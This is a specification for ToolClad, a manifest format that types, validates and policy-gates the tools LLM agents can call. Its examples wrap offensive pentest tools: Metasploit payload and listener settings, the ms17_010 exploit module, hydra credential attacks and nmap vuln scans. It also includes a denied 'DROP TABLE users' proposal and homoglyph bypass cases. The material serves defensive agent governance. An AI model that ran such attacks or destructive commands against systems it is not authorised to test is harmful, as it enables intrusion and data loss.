# ToolClad: Declarative Tool Interface Contracts for Agentic Runtimes

**Version**: 0.5.3
**Status**: Release Candidate  
**Author**: Jascha Wanger / ThirdKey AI  
**Date**: 2026-04-03  
**License**: MIT (protocol specification), Apache 2.0 (Symbiont integration)  

---

## Problem Statement

Every team building agentic systems hits the same wall: "How do I safely let an agent use my CLI tool?" The current answer is "write custom glue code." For each tool, you write a wrapper script (argument sanitization, timeout enforcement, output parsing, evidence capture), define Rust structs for MCP tool registration, implement the tool function, register it with Cedar resource/action mappings, add it to the agent DSL capabilities, write Cedar policies, and optionally write an output parser. That is a 7-step process per tool. It does not scale.

In Symbiont specifically, DSL agents reference tool names (`tool.nmap_scan`, `capabilities = ["tool.nmap_scan"]`) but there is no standard mechanism for the runtime to dispatch those references to actual executables. Users must wire tool dispatch in Rust code. This is the single largest barrier to adoption for non-Rust users who want to wrap existing CLI tools (security tools, data pipelines, devops automation, compliance checkers).

The broader ecosystem has no answer either. OpenShell/NemoClaw sandboxes agent execution and intercepts dangerous syscalls, but that is a deny-list firewall operating after the agent has already formulated an arbitrary shell command. There is no protocol for declaring what a tool accepts, how to invoke it safely, and what it produces.

---

## What ToolClad Is

ToolClad is a declarative manifest format (`.clad.toml`) that defines the complete behavioral contract for a tool: its typed parameters, validation rules, invocation mechanism, output parsing, and metadata for policy integration. A single manifest file replaces wrapper scripts, MCP tool schemas, and execution wiring.

A ToolClad manifest answers four questions:

1. **What can this tool accept?** Typed parameters with validation constraints (enums, ranges, regex, scope checks, injection sanitization).
2. **How do you invoke it?** A command template, HTTP request, MCP server call, PTY session, or browser engine action. The LLM never generates raw invocation details.
3. **What does it produce?** Output format declaration, parsing rules, and a mandatory output schema that normalize raw tool output into structured JSON. The LLM knows the shape of results before proposing a call.
4. **What is the interaction model?** Three execution modes with five backends share a common governance layer:
   - **Oneshot** (default): Execute and return. Three backends: shell command (`[command]`), HTTP request (`[http]`), or MCP server proxy (`[mcp]`).
   - **Session**: Maintain a running CLI process (PTY) where each interaction is independently validated and policy-gated.
   - **Browser**: Maintain a governed headless browser session where navigation, clicks, form submission, and JS execution are typed, scoped, and policy-gated.

A universal executor reads the manifest, validates arguments against declared types, dispatches to the appropriate backend, executes with timeout and resource controls, parses output, and wraps everything in a standard evidence envelope.

---

## The Security Model

ToolClad inverts the security model of sandbox-based approaches.

**Sandbox approach (OpenShell/NemoClaw):**

```
LLM generates shell command -> sandbox intercepts -> allow/deny
```

The agent formulates an arbitrary command string. The sandbox pattern-matches against known-dangerous operations. This is a deny-list. Deny-lists have gaps by definition.

**ToolClad approach:**

```
LLM fills typed parameters -> Cedar Gate evaluates policy ->
  executor validates args against manifest -> constructs command
  from template -> executes in sandbox -> parses output ->
  structured JSON back to agent
```

The agent never sees or generates a command string. It fills in typed fields. The manifest constrains the parameter space to only valid values. This is an allow-list. The dangerous action cannot be expressed because the interface does not permit it.

The manifest enables three properties that unstructured shell execution cannot:

- **Static analysis**: You can determine what any tool can possibly do before it ever runs, by inspecting the manifest. Cedar policies can reference manifest-declared properties.
- **Formal verification**: The parameter space is finite and enumerable for enum types, bounded for numeric types, and regex-constrained for string types. You can prove properties about valid invocations.
- **Automatic policy generation**: A tool with a `target` parameter of type `scope_target` inherently requires scope authorization. Cedar policies can be derived from manifests.

**For interactive tools, the security gap is even wider:**

```
Sandbox approach:    LLM types into PTY -> sandbox intercepts syscalls -> allow/deny
ToolClad sessions:   LLM selects session command -> Gate validates pattern + scope + state
                       -> SessionExecutor sends to PTY -> output framed and schema-validated
```

Sandboxing an interactive tool treats the entire session as a black box. An agent with an open `psql` connection could `DROP TABLE` as easily as `SELECT *` because both are text sent to a PTY. ToolClad session mode declares which commands are allowed (`[session.commands]`), validates each one against a regex pattern, applies independent Cedar policy evaluation per interaction, and tracks session state so policies can reference *where in the session* the agent is. The interactive tool becomes a typed, state-aware, policy-gated API surface.

**For browser agents, the gap is critical:**

```
Current browser agents:  LLM generates CDP/Playwright actions -> hope it stays on-task
ToolClad browser mode:   LLM selects browser command -> Gate validates URL scope + state
                           -> BrowserExecutor sends CDP command -> page state captured
```

Browser agents today (Claude in Chrome, OpenAI Operator, Playwright-based agents) rely on the LLM's instruction-following to stay on allowed domains, avoid submitting sensitive forms, and not execute arbitrary JavaScript. That is prompt-based security. ToolClad browser mode makes it structural: navigation URLs are scope-checked against an allow-list of domains, form submission requires human approval, and JS execution is a separately gated high-risk command. The governance layer is identical to session mode; only the transport differs.

---

## Manifest Format

### Minimal Example

```toml
# tools/whois_lookup.clad.toml
[tool]
name = "whois_lookup"
version = "1.0.0"
binary = "whois"
description = "WHOIS domain/IP registration lookup"
timeout_seconds = 30
risk_tier = "low"

[tool.cedar]
resource = "PenTest::ScanTarget"
action = "execute_tool"

[args.target]
position = 1
required = true
type = "scope_target"
description = "Domain name or IP address to query"

[command]
template = "whois {target}"

[output]
format = "text"
envelope = true

[output.schema]
type = "object"

[output.schema.properties.raw_output]
type = "string"
description = "Raw WHOIS registration data"
```

### Full Example

```toml
# tools/nmap_scan.clad.toml
[tool]
name = "nmap_scan"
version = "1.0.0"
binary = "nmap"
description = "Network port scanning and service detection"
timeout_seconds = 600
risk_tier = "low"

[tool.cedar]
resource = "PenTest::ScanTarget"
action = "execute_tool"

[tool.evidence]
output_dir = "{evidence_dir}/{scan_id}-nmap"
capture = true
hash = "sha256"

# --- Parameters ---

[args.target]
position = 1
required = true
type = "scope_target"
description = "Target CIDR, IP, or hostname"

[args.scan_type]
position = 2
required = true
type = "enum"
allowed = ["ping", "service", "version", "syn", "os_detect", "aggressive", "vuln_script"]
description = "Type of scan to perform"

[args.extra_flags]
position = 3
required = false
type = "string"
sanitize = ["injection"]
default = ""
description = "Additional nmap flags (must pass Gate approval)"

# --- Command Construction ---

[command]
template = "nmap {_scan_flags} --max-rate {max_rate} -oX {_output_file} --no-stylesheet -v {extra_flags} {target}"

[command.defaults]
max_rate = 1000

[command.mappings.scan_type]
ping = "-sn -PE"
service = "-sT -sV --version-intensity 5"
version = "-sV --version-all --top-ports 1000"
syn = "-sS --top-ports 1000"
os_detect = "-sS -O --osscan-guess"
aggressive = "-A -T4 --top-ports 10000"
vuln_script = "-sV --script=vuln --script-timeout 60s"

# --- Output ---

[output]
format = "xml"
parser = "builtin:xml"
# OR: parser = "scripts/parse-outputs/parse-nmap-xml.py"
envelope = true

[output.schema]
type = "object"

[output.schema.properties.hosts]
type = "array"
description = "Discovered hosts with open ports and services"

[output.schema.properties.hosts.items.properties.ip]
type = "string"

[output.schema.properties.hosts.items.properties.ports]
type = "array"

[output.schema.properties.hosts.items.properties.ports.items.properties.port]
type = "integer"

[output.schema.properties.hosts.items.properties.ports.items.properties.protocol]
type = "string"

[output.schema.properties.hosts.items.properties.ports.items.properties.service]
type = "string"

[output.schema.properties.hosts.items.properties.ports.items.properties.version]
type = "string"
```

### Dispatch Modes (added in v0.6.0)

The `tool.dispatch` field selects the execution model. It accepts two values:

| Value | Required sections | Use case |
|-------|-------------------|----------|
| `"exec"` *(default)* | At least one backend (`[command]` template/exec/executor, `[http]`, `[mcp]`, `[session]`, or `[browser]`) **and** an `[output]` block | ToolClad runs the backend itself and returns an evidence envelope. |
| `"callback"` | None — both the backend and `[output]` are optional | Validator-only embedding. ToolClad parses the manifest, generates the MCP input schema, and validates LLM-supplied arguments; in-process code performs the actual dispatch. |

`callback` mode exists for runtimes where ToolClad is the typed-argument fence rather than the executor. The Symbiont reasoning loop uses this pattern when a tool is implemented as a native Rust function: the manifest defines the contract, ToolClad enforces it, and the runtime maps the validated arguments onto a function call. No stub `[command]` or synthetic `[output]` block is required.

```toml
# tools/store_knowledge.clad.toml
[tool]
name = "store_knowledge"
version = "1.0.0"
binary = "callback"
description = "Persist a key/value into the agent's knowledge store"
risk_tier = "low"
dispatch = "callback"

[args.key]
position = 1
required = true
type = "string"
description = "Knowledge key"

[args.confidence]
position = 2
required = true
type = "number"
min_float = 0.0
max_float = 1.0
description = "Confidence in the asserted value"
```

Manifests with `dispatch = "callback"` still pass through every other validation step (argument types, custom-type resolution, MCP schema generation). They are rejected if any declared argument uses an unknown type or violates structural rules.

### Complex Example with Escape Hatch

```toml
# tools/metasploit_run.clad.toml
[tool]
name = "metasploit_run"
version = "1.0.0"
binary = "msfconsole"
description = "Metasploit Framework module execution"
timeout_seconds = 900
risk_tier = "high"
human_approval = true

[tool.cedar]
resource = "PenTest::ScanTarget"
action = "execute_tool"

[tool.evidence]
output_dir = "{evidence_dir}/{scan_id}-msf"
capture = true
hash = "sha256"

[args.module]
position = 1
required = true
type = "string"
pattern = "^(exploit|auxiliary|post)/[a-zA-Z0-9_/]+$"
description = "Metasploit module path"

[args.target]
position = 2
required = true
type = "scope_target"
description = "Target IP or hostname (RHOSTS)"

[args.port]
position = 3
required = false
type = "port"
default = 0
description = "Target port (RPORT)"

[args.payload]
position = 4
required = true
type = "string"
pattern = "^(cmd|generic|java|linux|osx|php|python|ruby|windows)/[a-zA-Z0-9_/]+$"
description = "Payload module path"

[args.lhost]
position = 5
required = true
type = "ip_address"
description = "Listener IP (LHOST)"

[args.lport]
position = 6
required = false
type = "port"
default = 4444
description = "Listener port (LPORT)"

[args.options]
position = 7
required = false
type = "msf_options"
description = "Additional set KEY VALUE options, semicolon-delimited"

# Escape hatch: this tool has session detection and module validation
# logic that exceeds what the template engine can express.
[command]
executor = "scripts/tool-wrappers/msf-wrapper.sh"

[output]
format = "text"
parser = "scripts/parse-outputs/parse-msf.py"
envelope = true

[output.schema]
type = "object"

[output.schema.properties.sessions]
type = "array"
description = "Established Metasploit sessions"

[output.schema.properties.sessions.items.properties.session_id]
type = "integer"

[output.schema.properties.sessions.items.properties.type]
type = "string"
description = "Session type (meterpreter, shell, etc.)"

[output.schema.properties.sessions.items.properties.target]
type = "string"

[output.schema.properties.module_output]
type = "string"
description = "Raw module execution output"
```

---

## Type System

Built-in validation types cover the patterns repeated across all existing wrapper scripts. Every type includes injection sanitization (shell metacharacter rejection) by default. Types are designed so that "valid according to the type" means "safe to interpolate into a shell command."

### Core Types

| Type | Validates | Examples |
|------|-----------|---------|
| `string` | Non-empty, injection-safe | General text arguments |
| `integer` | Numeric, optional `min`/`max` with clamping | Thread counts, retry limits |
| `number` | Float, optional `min_float`/`max_float` with clamping; rejects NaN/inf | Confidence scores, ratios |
| `port` | Numeric, 1-65535 | Network ports |
| `boolean` | Exactly `"true"` or `"false"` | Feature flags |
| `enum` | Value in declared `allowed` list | Scan types, protocols, severity levels |
| `scope_target` | Injection-safe + ASCII-only + reject IDN/punycode + block wildcards/traversal | IPs, CIDRs, ASCII hostnames |
| `url` | Valid URL structure, host extracted for scope validation | Web application targets |
| `path` | No traversal (`../`), optionally must exist | Wordlists, config files, output dirs |
| `ip_address` | Valid IPv4 or IPv6 | Listener addresses, bind addresses |
| `cidr` | Valid CIDR notation | Network ranges |

### Extended Types

| Type | Validates | Use Case |
|------|-----------|----------|
| `msf_options` | Semicolon-delimited `set KEY VALUE` pairs, no shell metacharacters | Metasploit extra options |
| `credential_file` | Path type + must exist + read-only check | Username/password lists |
| `duration` | Integer with suffix (s/m/h) or bare seconds | Timeout overrides |
| `regex_match` | Matches a declared `pattern` (PCRE) | Module paths, format strings |

#### `scope_target` ASCII / IDN policy (since v0.6.0)

`scope_target` is intentionally ASCII-strict. In addition to rejecting shell metacharacters, wildcards, and traversal sequences (`../`, leading `/`, backslashes), it refuses:

- **Non-ASCII characters** in the hostname (e.g. Cyrillic homoglyphs such as `exаmple.com`).
- **Punycode A-labels** of the form `xn--…` (case-insensitive), at any DNS label position.

This is defense-in-depth against IDN homoglyph bypass: an attacker who registers a Cyrillic look-alike domain and supplies its punycode form (`xn--example-9c.com`) cannot get past the ASCII regex without this rejection. Refusal messages distinguish each failure shape (`traversal`, `'/'`, `backslash`, `ASCII`, `punycode`) so per-fence bite-rate analysis and forensic triage can separate attack categories rather than collapsing them into a single generic error. If your tool legitimately needs to accept IDN hostnames, gate IDN registration upstream and feed the resolved IPs (or pre-validated ASCII names) into the manifest.

### Type Composition

Types can be extended with additional constraints:

```toml
[args.threads]
type = "integer"
min = 1
max = 64
clamp = true       # Values outside range are clamped, not rejected
default = 4
description = "Concurrent threads"

[args.confidence]
type = "number"
min_float = 0.0    # Use min_float / max_float for `number`; min / max are integer-only.
max_float = 1.0
clamp = true       # Optional — clamp to [min_float, max_float] instead of rejecting
description = "Confidence score"

[args.service]
type = "enum"
allowed = ["ssh", "ftp", "http-get", "http-post-form", "smb", "rdp", "mysql", "postgres"]
description = "Target service protocol"

[args.target_url]
type = "url"
schemes = ["http", "https"]       # Only these URL schemes
scope_check = true                 # Extract host for scope validation
description = "Target web application URL"

[args.module_path]
type = "string"
pattern = "^(exploit|auxiliary|post)/[a-zA-Z0-9_/]+$"
sanitize = ["injection"]
description = "Metasploit module path"
```

### Custom Types

Projects can define reusable custom types in a `toolclad.toml` at the project root:

```toml
# toolclad.toml -- project-level ToolClad configuration

[types.service_protocol]
base = "enum"
allowed = ["ssh", "ftp", "http", "https", "smb", "rdp", "mysql", "postgres", "mssql", "vnc"]

[types.severity_level]
base = "enum"
allowed = ["info", "low", "medium", "high", "critical"]

[types.nuclei_template_id]
base = "string"
pattern = "^[a-zA-Z0-9_-]+(/[a-zA-Z0-9_-]+)*$"
```

Then reference them in tool manifests:

```toml
[args.service]
type = "service_protocol"
```

---

## Command Construction

The command construction layer is the core mechanism that prevents LLMs from generating arbitrary shell commands. Parameters are validated, then interpolated into a declared command structure.

### Invocation Forms

ToolClad supports two invocation forms for command construction:

**Array form (preferred):** Each argument is a separate argv entry, passed directly to `execve`/`os/exec`/`subprocess` without shell interpretation. Values containing spaces, quotes, or special characters are safe because they are never re-split.

```toml
[command]
exec = ["curl", "-H", "Authorization: {token}", "{target}"]
```

**String template form (legacy):** A single string that is split into argv via `shlex` (Rust/Python) or a quote-aware splitter (Go/JS) before execution. This works for simple cases but breaks when validated parameter values contain spaces (e.g., commit messages, custom HTTP headers).

```toml
[command]
template = "whois {target}"
```

When both `exec` and `template` are present, `exec` takes precedence. New manifests SHOULD use `exec`. Executors MUST NOT route either form through a shell (`sh -c`, `bash -c`, `cmd /c`).

### Template Variables

| Variable | Source |
|----------|--------|
| `{arg_name}` | Validated parameter value |
| `{_scan_flags}` | Resolved from `[command.mappings]` |
| `{_output_file}` | Auto-generated evidence output path |
| `{_scan_id}` | Auto-generated scan/invocation ID |
| `{_evidence_dir}` | Evidence directory from runtime config |

Variables prefixed with `_` are injected by the executor, not provided by the agent.

### Mappings

Mappings translate logical parameter values to actual CLI flags:

```toml
[command.mappings.scan_type]
ping = "-sn -PE"
service = "-sT -sV --version-intensity 5"
syn = "-sS --top-ports 1000"
```

The template references the mapped value as `{_scan_flags}` (derived from `scan_type`). The naming convention: `_{arg_name}_flags` or a custom name declared in the mapping.

### Conditional Sections

For tools where some flags are only present when certain parameters are set:

```toml
[command]
template = "hydra {_service_flags} {_credential_flags} {_thread_flags} {target}"

[command.conditionals]
# Only include -s PORT if port != 0
service_port = { when = "port != 0", template = "-s {port}" }
# Only include -L/-P if files are provided
username_file = { when = "username_file != ''", template = "-L {username_file}" }
password_file = { when = "password_file != ''", template = "-P {password_file}" }
# Only include -l/-p if single credentials are provided
single_user = { when = "username != '' and username_file == ''", template = "-l {username}" }
single_pass = { when = "password != '' and password_file == ''", template = "-p {password}" }
```

**SECURITY REQUIREMENT:** Conditional expressions MUST be evaluated using a closed-vocabulary parser that supports only: variable names, `==`, `!=`, string/numeric literals, and `and`/`or` conjunctions. Implementations MUST NOT use `eval()`, `Function()`, `exec()`, or any dynamic code execution mechanism to resolve conditions. Doing so creates a Remote Code Execution (RCE) vulnerability if an attacker can influence manifest content or argument values. All four reference implementations enforce this with a regex-based comparison parser.

### Escape Hatch

When a tool's invocation logic exceeds what the template engine can express, the manifest can delegate to a custom executor:

```toml
[command]
executor = "scripts/tool-wrappers/msf-wrapper.sh"
```

The custom executor receives validated, typed arguments as environment variables (`TOOLCLAD_ARG_MODULE`, `TOOLCLAD_ARG_TARGET`, etc.) and the standard executor variables (`TOOLCLAD_SCAN_ID`, `TOOLCLAD_OUTPUT_DIR`, `TOOLCLAD_EVIDENCE_DIR`). It still benefits from:

- Parameter validation (before the executor is called)
- Scope enforcement (on scope_target args)
- Timeout enforcement (the executor is wrapped in a process timeout)
- Evidence envelope (the executor's stdout is captured and wrapped)
- Cedar policy evaluation (before anything executes)

The escape hatch is for command construction only. All other ToolClad guarantees still apply.

### Process Lifecycle and Timeout Enforcement

Tools like Metasploit, complex Python scanners, and shell wrappers frequently spawn child background workers. A naive `timeout_seconds` that only sends `SIGTERM` to the parent process leaves orphaned children consuming resources.

**Requirement:** Executors MUST spawn tool processes in a **new process group** (PGID) and kill the entire group on timeout:

| Platform | Create Group | Kill Group |
|----------|-------------|------------|
| Rust | `cmd.process_group(0)` | `libc::killpg(pid, SIGKILL)` |
| Go | `SysProcAttr{Setpgid: true}` | `syscall.Kill(-pid, SIGKILL)` |
| Python | `preexec_fn=os.setpgrp` | `os.killpg(os.getpgid(pid), SIGKILL)` |
| Node.js | `detached: true` | `process.kill(-pid, 'SIGKILL')` |

This prevents zombie process accumulation in long-running agent containers. All four reference implementations enforce process group kill.

---

## HTTP Backend

HTTP API tools are structurally identical to oneshot CLI tools: validate inputs, construct the request, execute, parse the response. The manifest uses an `[http]` section instead of `[command]`. No new execution mode; this is a backend for oneshot.

### HTTP Manifest Example

```toml
# tools/slack_post_message.clad.toml
[tool]
name = "slack_post_message"
version = "1.0.0"
description = "Post a message to a Slack channel"
timeout_seconds = 30
risk_tier = "medium"

[tool.cedar]
resource = "Comms::SlackChannel"
action = "post_message"

[http]
method = "POST"
url = "https://slack.com/api/chat.postMessage"
headers = { "Authorization" = "Bearer {_secret:slack_token}", "Content-Type" = "application/json" }
body_template = '{"channel": "{channel}", "text": "{message}"}'
success_status = [200]
error_status = [400, 401, 403, 404, 429]

[args.channel]
type = "string"
required = true
pattern = "^[A-Z0-9]+$"
description = "Slack channel ID"

[args.message]
type = "string"
required = true
sanitize = ["injection"]
description = "Message text to post"

[output]
format = "json"
parser = "builtin:json"
envelope = true

[output.schema]
type = "object"

[output.schema.properties.ok]
type = "boolean"
description = "Whether the API call succeeded"

[output.schema.properties.ts]
type = "string"
description = "Message timestamp (Slack message ID)"
```

### Secrets in HTTP Requests

The `{_secret:name}` syntax references secrets from Symbiont's Vault/OpenBao integration. Secrets are resolved by the executor at invocation time and never appear in the manifest, the MCP schema, or the LLM context. The agent proposes `slack_post_message(channel="C01234", message="hello")` and the executor injects the bearer token from Vault.

This applies to headers, URL parameters, and body template values:

```toml
[http]
url = "https://api.example.com/v1/{endpoint}?key={_secret:api_key}"
headers = { "Authorization" = "Bearer {_secret:bearer_token}" }
```

### HTTP Request Construction

The executor constructs the HTTP request from the `[http]` section:

1. Interpolate `{arg_name}` placeholders in `url`, `headers`, and `body_template` with validated parameter values
2. Resolve `{_secret:name}` references from secrets management
3. Set method, headers, and body
4. Execute with timeout
5. Check response status against `success_status` / `error_status`
6. Parse response body with the declared parser
7. Validate against `[output.schema]`
8. Wrap in evidence envelope

All ToolClad guarantees apply: argument validation, Cedar policy evaluation, output schema validation, evidence capture with hash, and audit trail. The HTTP backend simply swaps shell execution for an HTTP client.

---

## MCP Proxy Backend

The MCP proxy backend wraps an existing MCP server tool in a ToolClad manifest that applies stricter validation and Cedar policy gating. The manifest uses an `[mcp]` section instead of `[command]`. The upstream MCP tool is an implementation detail; the agent sees the ToolClad contract.

### Why Proxy MCP Tools?

MCP tools from marketplaces and third-party servers have permissive JSON Schemas. A GitHub MCP tool might accept any string for a repository name. A database MCP tool might accept any SQL query. The ToolClad manifest constrains these inputs with the full type system (regex patterns, enums, scope checks) and subjects every invocation to Cedar policy evaluation.

This directly addresses the ClawHub-style supply chain problem: instead of trusting a marketplace MCP tool's self-declared schema, you wrap it in a `.clad.toml` that defines the contract *you* trust. SchemaPin verifies the manifest. Cedar governs the invocation. The upstream MCP tool just executes.

### MCP Proxy Manifest Example

```toml
# tools/github_create_issue.clad.toml
[tool]
name = "github_create_issue"
version = "1.0.0"
description = "Create a GitHub issue in an allowed repository"
timeout_seconds = 30
risk_tier = "medium"

[tool.cedar]
resource = "Dev::GitHubRepo"
action = "create_issue"

[mcp]
server = "github-mcp"
tool = "create_issue"

[args.repo]
type = "string"
required = true
pattern = "^[a-zA-Z0-9_-]+/[a-zA-Z0-9_.-]+$"
description = "Repository in owner/repo format"

[args.title]
type = "string"
required = true
sanitize = ["injection"]
description = "Issue title"

[args.body]
type = "string"
required = false
description = "Issue body (markdown)"

[args.labels]
type = "string"
required = false
pattern = "^[a-zA-Z0-9_, -]+$"
description = "Comma-separated label names"

[output]
format = "json"
parser = "builtin:json"
envelope = true

[output.schema]
type = "object"

[output.schema.properties.number]
type = "integer"
description = "Created issue number"

[output.schema.properties.url]
type = "string"
description = "URL of the created issue"

[output.schema.properties.state]
type = "string"
description = "Issue state (open)"
```

### MCP Proxy Execution Flow

1. ToolClad validates all arguments against the manifest's type system (stricter than upstream)
2. Cedar evaluates policy (e.g., "this agent can only create issues in `ThirdKeyAI/*` repos")
3. Executor maps validated arguments to the upstream MCP tool's expected input format
4. Executor forwards the call to the MCP server referenced by `server` in `symbiont.toml`
5. Response is parsed and validated against `[output.schema]`
6. Wrapped in evidence envelope with audit trail

The `[mcp].server` field references a named MCP server connection in `symbiont.toml`:

```toml
# symbiont.toml
[mcp.servers.github-mcp]
command = "npx"
args = ["-y", "@modelcontextprotocol/server-github"]
env = { GITHUB_TOKEN = "${vault:github/api-token}" }
```

### Field Mapping

When the ToolClad argument names differ from the upstream MCP tool's parameter names, an explicit mapping can be declared:

```toml
[mcp]
server = "github-mcp"
tool = "create_issue"

[mcp.field_map]
repo = "repository"       # ToolClad "repo" -> upstream "repository"
labels = "label_names"     # ToolClad "labels" -> upstream "label_names"
```

Unmapped fields pass through with the same name. This decouples the ToolClad contract from the upstream tool's naming conventions.

---

## Output Handling

### Built-in Parsers

| Parser | Produces | Use Case |
|--------|----------|----------|
| `builtin:json` | Passes through as-is | Tools with native JSON output |
| `builtin:xml` | Converts to JSON | nmap, Nessus, OWASP ZAP |
| `builtin:csv` | Array of objects | Spreadsheet exports, log files |
| `builtin:text` | `{ "raw_output": "..." }` | Simple tools with unstructured output |
| `builtin:jsonl` | Array of JSON objects | Nuclei, streaming tools |

### Custom Parsers

```toml
[output]
parser = "scripts/parse-outputs/parse-nmap-xml.py"
```

Custom parsers receive the raw output file path as argv[1] and must emit JSON to stdout. The parser's output is validated against the declared `[output.schema]` before it reaches the agent.

### Output Schema

Every `dispatch = "exec"` manifest must declare the expected shape of its parsed results in `[output.schema]` (callback-dispatch manifests omit the `[output]` block — see [Dispatch Modes](#dispatch-modes-added-in-v060)). The schema serves two purposes:

1. **MCP `outputSchema` generation**: The LLM sees what data shape it will receive *before* proposing a tool call. This enables more effective reasoning about whether and how to use a tool.
2. **Parser output validation**: The executor validates parsed results against the schema. Malformed parser output is rejected before it reaches the agent, preventing corrupted state in the ORGA loop.

```toml
[output.schema]
type = "object"

[output.schema.properties.hosts]
type = "array"
description = "Discovered hosts with open ports and services"

[output.schema.properties.hosts.items.properties.ip]
type = "string"
description = "Host IP address"

[output.schema.properties.hosts.items.properties.hostname]
type = "string"
description = "Resolved hostname (if available)"

[output.schema.properties.hosts.items.properties.ports]
type = "array"
description = "Open ports with service details"

[output.schema.properties.hosts.items.properties.ports.items.properties.port]
type = "integer"

[output.schema.properties.hosts.items.properties.ports.items.properties.protocol]
type = "string"

[output.schema.properties.hosts.items.properties.ports.items.properties.service]
type = "string"

[output.schema.properties.hosts.items.properties.ports.items.properties.version]
type = "string"
```

For tools with simple or opaque output, a minimal schema is acceptable:

```toml
# Simple text tool
[output.schema]
type = "object"

[output.schema.properties.raw_output]
type = "string"
description = "Raw command output text"
```

The schema is intentionally JSON Schema-compatible so it maps directly to MCP `outputSchema` with no transformation. The same schema definition feeds both the LLM (via MCP) and the executor (for validation).

### Evidence Envelope

When `envelope = true` (default), the executor wraps parsed output in a standard envelope:

```json
{
  "status": "success",
  "scan_id": "1711929600-12345",
  "tool": "nmap_scan",
  "command": "nmap -sT -sV --max-rate 1000 -oX /evidence/... 10.0.1.0/24",
  "exit_code": 0,
  "stderr": "",
  "duration_ms": 4523,
  "timestamp": "2026-03-20T12:00:00Z",
  "output_file": "/evidence/1711929600-12345-nmap/scan.xml",
  "output_hash": "sha256:a1b2c3...",
  "results": { ... }
}
```

On error, `exit_code` and `stderr` provide the debugging context an LLM agent needs to self-correct:

```json
{
  "status": "error",
  "exit_code": 1,
  "stderr": "nmap: unrecognized option '--invalid-flag'\nSee nmap -h for help.",
  "results": null
}
```

This is the JSON the agent receives. Every field is deterministic and machine-readable. The `output_hash` provides tamper detection for the evidence chain. The `results` field contains the parsed output, validated against the declared `[output.schema]`. The `exit_code` and `stderr` fields MUST be present in all envelopes — they are critical for agent self-correction when tools fail due to bad flags, network errors, or misconfiguration.

---

## Stateful Sessions: CLI and Browser

Beyond oneshot execution, ToolClad supports stateful sessions where a tool process stays alive across multiple agent interactions. The key design insight: the governance layer (typed commands, per-interaction Cedar gating, scope enforcement, state-aware policies, output schema validation, evidence capture) is transport-agnostic. What changes between session types is the transport backend.

| Mode | Backend | State Source | Ready Signal | Use Case |
|---|---|---|---|---|
| `oneshot` | Shell command (`[command]`) | N/A | Process exit | CLI tools (nmap, jq, git) |
| `oneshot` | HTTP request (`[http]`) | N/A | Response received | REST/GraphQL APIs (Slack, GitHub, Stripe) |
| `oneshot` | MCP proxy (`[mcp]`) | N/A | MCP response | Governed proxy over existing MCP tools |
| `session` | PTY (pseudo-terminal) | Prompt regex parsing | Prompt pattern match | Interactive CLIs (msfconsole, psql, gdb) |
| `browser` | CDP-direct WebSocket | URL + accessibility tree + DOM | Page load + network idle | Web interaction (headless or live browser) |

All five backends share: typed parameters, argument validation, Cedar policy evaluation, scope enforcement, output schema validation, evidence capture, and audit trail. The manifest format is the same. The executor implementation differs.

### The Problem with Stateful Tools

Tools like `msfconsole`, `psql`, `redis-cli`, headless browsers, and cloud CLI interactive modes maintain a running process that accepts commands over time. The oneshot model (validate, construct, execute, parse) does not fit because:

1. The tool stays alive across multiple agent interactions
2. Each interaction changes the tool's internal state (loaded module, connected database, current page)
3. The agent needs to see intermediate output to decide its next command
4. Different commands within the same session carry different risk levels

Sandboxing the entire process treats the session as a black box. It can block dangerous syscalls but cannot govern *what the agent says* to the tool. An agent with an open `psql` session could `DROP TABLE` as easily as `SELECT *`. An agent with a browser could navigate to any domain. ToolClad stateful sessions declare which commands are allowed, validate each one independently, and gate every interaction through Cedar policy evaluation.

---

### CLI Session Mode

CLI session mode manages interactive command-line tools through a PTY (pseudo-terminal). The agent sends typed, validated commands to a running process and receives structured output parsed from the terminal stream.

#### Per-Interaction ORGA Gating

Session mode turns each round of interaction into its own ORGA cycle:

```
Iteration 1:
  Observe:  "psql is ready, showing dbname=> prompt"
  Reason:   LLM proposes "SELECT * FROM users LIMIT 10"
  Gate:     Cedar checks: is SELECT allowed? Is this agent read-only?
            ToolClad validates: command matches read_query pattern
  Act:      SessionExecutor sends command to PTY, waits for next prompt

Iteration 2:
  Observe:  "Query returned 10 rows, showing dbname=> prompt"
  Reason:   LLM proposes "DROP TABLE users"
  Gate:     Cedar checks: is DROP allowed? -> DENY
  Act:      (blocked, denial fed back to agent)
```

Every command the agent sends to the interactive tool passes through Cedar policy evaluation and ToolClad pattern validation. The LLM cannot free-type into a terminal. It selects from declared, validated, policy-gated operations.

#### Session Manifest

```toml
# tools/msfconsole.clad.toml
[tool]
name = "msfconsole_session"
binary = "msfconsole"
mode = "session"
description = "Interactive Metasploit Framework session"
risk_tier = "high"

[tool.cedar]
resource = "PenTest::ScanTarget"
action = "execute_tool"

[tool.evidence]
output_dir = "{evidence_dir}/{session_id}-msf"
capture = true
hash = "sha256"

# --- Session Lifecycle ---

[session]
startup_command = "msfconsole -q -x 'color false'"
ready_pattern = "^msf[0-9].*> $"
startup_timeout_seconds = 30
idle_timeout_seconds = 300
session_timeout_seconds = 1800
max_interactions = 100

[session.interaction]
input_sanitize = ["injection"]
output_max_bytes = 1048576
output_wait_ms = 2000

# --- Session Commands (the allow-list) ---
# Each command becomes an MCP tool: msfconsole_session.use_module, etc.

[session.commands.use_module]
pattern = "^use (exploit|auxiliary|post)/[a-zA-Z0-9_/]+$"
description = "Load a Metasploit module"
risk_tier = "medium"

[session.commands.set_option]
pattern = "^set [A-Za-z0-9_]+ .+$"
description = "Set a module option"
risk_tier = "low"

[session.commands.set_target]
pattern = "^set RHOSTS .+$"
description = "Set the target"
extract_target = true
risk_tier = "medium"

[session.commands.run]
pattern = "^(run|exploit)$"
description = "Execute the loaded module"
risk_tier = "high"
human_approval = true

[session.commands.sessions_list]
pattern = "^sessions -l$"
description = "List active sessions"
risk_tier = "low"

# --- Output Schema ---

[output.schema]
type = "object"

[output.schema.properties.prompt]
type = "string"
description = "Current tool prompt (indicates internal state)"

[output.schema.properties.output]
type = "string"
description = "Tool output from the last command"

[output.schema.properties.session_state]
type = "string"
enum = ["ready", "module_loaded", "configured", "running", "completed", "error"]
description = "Inferred session state from prompt analysis"

[output.schema.properties.interaction_count]
type = "integer"
description = "Number of interactions in this session so far"
```

#### Session Commands as Typed MCP Tools

The `[session.commands]` section is the critical difference from open-ended terminal access. Each declared command becomes a separate MCP tool visible to the LLM during the session:

| MCP Tool Name | LLM Sees | Agent Provides |
|---|---|---|
| `msfconsole_session.use_module` | "Load a Metasploit module" | `{ "command": "use exploit/windows/smb/ms17_010" }` |
